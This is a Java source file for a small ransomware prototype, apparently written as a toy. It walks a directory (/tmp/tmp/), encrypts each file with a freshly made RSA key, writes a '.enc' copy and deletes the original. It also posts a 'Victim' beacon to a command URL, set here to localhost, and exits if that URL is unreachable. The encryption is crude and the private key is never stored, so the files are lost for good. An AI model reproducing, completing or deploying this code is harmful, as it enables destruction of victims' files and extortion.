import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.stream.Stream;
import javax.crypto.Cipher;

class secret {
	private String req_url="http://127.0.0.1/recv.php";
	KeyPair secret(){
		KeyPairGenerator kpg = null;
		try{
			kpg = KeyPairGenerator.getInstance("RSA");
		} catch (NoSuchAlgorithmException e) {
			throw new RuntimeException(e);
		}
		kpg.initialize(2048);
		KeyPair kp = kpg.generateKeyPair();
		return kp;
	}
	void encryptFiles(int cipherMode,PublicKey pKey,String inputFile,String outputFile) throws Exception{
			Cipher cipher = Cipher.getInstance("RSA");
			cipher.init(Cipher.ENCRYPT_MODE,pKey);
			String textString = "";
			textString = new String(Files.readAllBytes(Paths.get(inputFile)));
			byte[] cipherText = cipher.doFinal(textString.getBytes());
			BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile));
			writer.write(Base64.getEncoder().encodeToString(cipherText));
			writer.close();
    }
    void initiaiteConnection() throws IOException{
        sendPOST();
    }

    private void sendPOST() throws IOException{
        URL obj = new URL(req_url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        con.addRequestProperty("Victim", "Yes");
		int maxTries = 3;
		while(maxTries != 0){
			int code = con.getResponseCode();
			if(code == 200){
				break;
			}
			maxTries--;
		}
		if(maxTries == 0){
			//code for self destruction
			System.out.println("Not Reachable!");
			System.exit(0);
		}
    }
}

class RansomwareActivate{
	void encryptAllFiles() throws IOException{
		secret sec = new secret();
		sec.initiaiteConnection();
		KeyPair kp = sec.secret();
		List<Path> fileNames = new ArrayList<Path>();
		try{
			Stream<Path> paths = Files.walk(Paths.get("/tmp/tmp/"));
			paths.filter(Files::isRegularFile).forEach(fileNames::add);
		}
		catch (Exception e){
			System.out.println(e);
		}
		for(Path file:fileNames){
			try{
				System.out.println("Encrypting file: "+file.toString());
				sec.encryptFiles(Cipher.ENCRYPT_MODE, kp.getPublic(), file.toString(),file.toString()+".enc");
				File f = new File(file.toString());
				f.delete();
			}
			catch (Exception e){
				System.out.println(e);
			}
		}
	}
}

class encrypt {
	void activate() throws IOException{
		RansomwareActivate ransomware  = new RansomwareActivate();
		ransomware.encryptAllFiles();
	}
	public static void main(String[] args) throws IOException{
		secret sec = new secret();
		sec.initiaiteConnection();
	}
}